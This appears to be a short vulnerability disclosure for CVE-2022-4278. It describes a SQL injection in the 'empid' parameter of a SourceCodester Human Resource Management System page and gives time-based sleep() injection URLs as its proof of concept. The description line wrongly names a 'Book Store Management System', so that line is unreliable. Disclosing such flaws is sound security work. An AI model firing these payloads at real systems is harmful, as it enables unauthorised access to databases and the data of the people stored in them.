# [CVE-2022-4278](https://www.cve.org/CVERecord?id=CVE-2022-4278)

SourceCodester Human Resource Management System 1.0 /hrm/employeeadd.php empid sql injection

Description: Vulnerability was found in SourceCodester Book Store Management System 1.0. A SQL Injection vulnerability in /hrm/employeeadd.php with `empid` handler.

The product(s): https://www.sourcecodester.com/php/15740/human-resource-management-system-project-php-and-mysql-free-source-code.html

Affected product(s)/code base: https://www.sourcecodester.com/sites/default/files/download/oretnom23/hrm.zip

Affected component(s): /hrm/employeeadd.php

# Source code analysis

The `empid` handler don't have input validation from user.

![](images/empid.png)

# Proof of Concept

Login as admin and go to `http://localhost/hrm/employeeadd.php`

Payload SQLi with sleep(1): /hrm/employeeadd.php?empid=1%27%20or%20sleep(1)%20--%20-

![](images/sqli-sleep-1.png)

Payload SQLi with sleep(10): /hrm/employeeadd.php?empid=1%27%20or%20sleep(10)%20--%20-

![](images/sqli-sleep-10.png)

Check payload at MySQL log:

![](images/mysql-log.png)